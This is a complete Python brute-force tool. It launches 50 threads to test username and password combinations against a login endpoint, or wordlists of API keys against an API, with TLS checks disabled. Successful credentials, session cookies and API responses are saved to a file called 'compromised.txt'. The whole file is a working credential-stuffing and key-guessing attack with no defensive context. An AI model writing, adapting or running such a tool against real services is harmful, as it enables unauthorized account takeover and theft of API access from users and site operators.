#!/usr/bin/env python3

import sys
import time
import argparse
import requests
import threading
from queue import Queue

requests.packages.urllib3.disable_warnings()

class BruteForceWorker(threading.Thread):
    def __init__(self, url, queue, output_file, attack_type):
        threading.Thread.__init__(self)
        self.url = url
        self.queue = queue
        self.output_file = output_file
        self.attack_type = attack_type
        self.running = True
    
    def run(self):
        while self.running and not self.queue.empty():
            try:
                item = self.queue.get(timeout=1)
                
                if self.attack_type == "login":
                    username, password = item
                    data = {"email": username, "password": password}
                    
                    response = requests.post(
                        self.url,
                        data=data,
                        timeout=3,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    if response.status_code in [302, 200]:
                        with open(self.output_file, "a") as f:
                            f.write(f"LOGIN: {username}:{password}\n")
                            f.write(f"COOKIES: {response.cookies.get_dict()}\n\n")
                        sys.stderr.write(f"\n[FOUND] {username}:{password}\n")
                
                elif self.attack_type == "api":
                    key = item
                    headers = {"Authorization": f"Bearer {key}"}
                    
                    response = requests.get(
                        self.url,
                        headers=headers,
                        timeout=3,
                        verify=False
                    )
                    
                    if response.status_code == 200:
                        with open(self.output_file, "a") as f:
                            f.write(f"API_KEY: {key}\n")
                            f.write(f"RESPONSE: {response.text[:500]}\n\n")
                        sys.stderr.write(f"\n[FOUND] API Key: {key}\n")
                
                self.queue.task_done()
                
            except:
                pass
    
    def stop(self):
        self.running = False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--type", required=True, choices=["login", "api"])
    parser.add_argument("--url", required=True)
    parser.add_argument("--username-list")
    parser.add_argument("--password-list")
    parser.add_argument("--key-list")
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--output", default="compromised.txt")
    args = parser.parse_args()
    
    queue = Queue()
    
    if args.type == "login":
        if not args.username_list or not args.password_list:
            sys.stderr.write("Username and password list required for login attack\n")
            sys.exit(1)
        
        usernames = open(args.username_list).read().splitlines()
        passwords = open(args.password_list).read().splitlines()
        
        for u in usernames:
            for p in passwords:
                queue.put((u, p))
    
    elif args.type == "api":
        if not args.key_list:
            sys.stderr.write("Key list required for API attack\n")
            sys.exit(1)
        
        keys = open(args.key_list).read().splitlines()
        for k in keys:
            queue.put(k)
    
    workers = []
    for _ in range(50):
        w = BruteForceWorker(args.url, queue, args.output, args.type)
        w.start()
        workers.append(w)
    
    time.sleep(args.duration)
    
    for w in workers:
        w.stop()
    
    for w in workers:
        w.join(timeout=1)
    
    sys.stderr.write(f"\n[BRUTE] Completed. Results saved to {args.output}\n")

if __name__ == "__main__":
    main()
